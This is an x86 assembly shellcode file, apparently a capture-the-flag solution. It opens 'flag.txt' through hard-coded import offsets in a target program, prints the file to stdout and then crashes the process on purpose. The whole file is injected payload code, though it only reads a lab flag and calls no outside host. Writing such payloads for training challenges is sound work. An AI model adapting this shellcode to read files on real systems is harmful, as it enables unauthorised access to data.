[bits 32]

; Constants
CREATEFILEW_OFFSET      equ 0x2511C
READFILE_OFFSET         equ 0x250FC
GETSTDHANDLE_OFFSET     equ 0x250CC
WRITEFILE_OFFSET        equ 0x250D8
SLEEPEX_OFFSET          equ 0x2500C

STD_OUTPUT_HANDLE       equ 0xfffffff5

; Shellcode start
start:

  ; Get the instruction pointer into EBX.
  call @@
@@:
  pop ebx

  ; Get the program image base into ESI.
  mov esi, ebx
  and esi, 0xffff0000
  mov esi, [esi]

  ; Call CreateFileW() to open the flag file.
  push 0          ; hTemplateFile (NULL)
  push 0x80       ; dwFlagsAndAttributes (FILE_ATTRIBUTE_NORMAL)
  push 3          ; dwCreationDisposition (OPEN_EXISTING)
  push 0          ; lpSecurityAttributes (NULL)
  push 1          ; dwShareMode (FILE_SHARE_READ)
  push 0x80000000 ; dwDesiredAccess (GENERIC_READ)
  lea  eax, [ebx + (flag_path) - @@]
  push eax        ; lpFileName (L"flag.txt")
  call [esi + CREATEFILEW_OFFSET]

  ; Check for failure.
  test eax, eax
  je   end

  ; Save the file handle in EDI.
  mov  edi, eax

  ; Call ReadFile() to read the flag.
  push 0          ; lpOverlapped (NULL)
  lea  eax, [ebx + (bytes_processed) - @@] 
  push eax        ; lpNumberOfBytesRead
  push 256        ; nNumberOfBytesToRead (256)
  lea  eax, [ebx + (flag_buffer) - @@]
  push eax        ; lpBuffer
  push edi        ; hFile
  call [esi + READFILE_OFFSET]

  ; Call WriteFile() to print out the flag.
  push 0          ; lpOverlapped (NULL)
  lea  eax, [ebx + (bytes_processed) - @@] 
  push eax        ; lpNumberOfBytesWritten
  push 256        ; nNumberOfBytesToWrite
  lea  eax, [ebx + (flag_buffer) - @@]
  push eax        ; lpBuffer
  
  push STD_OUTPUT_HANDLE ; nStdHandle
  call [esi + GETSTDHANDLE_OFFSET]

  push eax        ; hFile
  call [esi + WRITEFILE_OFFSET]

  ; Call SleepEx() to give the kernel time to flush buffers and send the flag out.
  push 0          ; bAlertable (FALSE)
  push 5000       ; dwMilliseconds
  call [esi + SLEEPEX_OFFSET]
  
end:
  ; Crash the application.
  xor eax, eax
  jmp eax

flag_path: db 'f', 0, 'l', 0, 'a', 0, 'g', 0, '.', 0, 't', 0, 'x', 0, 't', 0, 0, 0
bytes_processed: dd 0
flag_buffer: db 0

